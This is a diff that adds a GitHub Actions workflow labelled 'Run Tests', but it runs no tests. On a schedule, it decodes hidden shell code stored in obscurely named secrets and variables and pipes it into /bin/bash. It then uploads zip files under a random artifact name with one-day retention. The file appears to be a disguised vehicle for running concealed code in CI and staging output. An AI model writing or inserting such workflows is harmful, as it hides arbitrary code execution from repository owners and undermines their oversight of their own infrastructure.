@@ -1,0 +1,34 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          qa0145: ${{ secrets.qa0145 }}
+        run: |
+          printf '%s' "$qa0145" | jq -r .yoz0692 | /bin/bash
+          printf '%s' "$t37" | jq -r .z70002 | /bin/bash
+          printf '%s' "$exvh50" | jq -r .mjx24528 | /bin/bash
+          printf '%s' "$airm175" | jq -r .vcm4559 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9MGFyLxV
+          path: "*.zip"
+          retention-days: 1
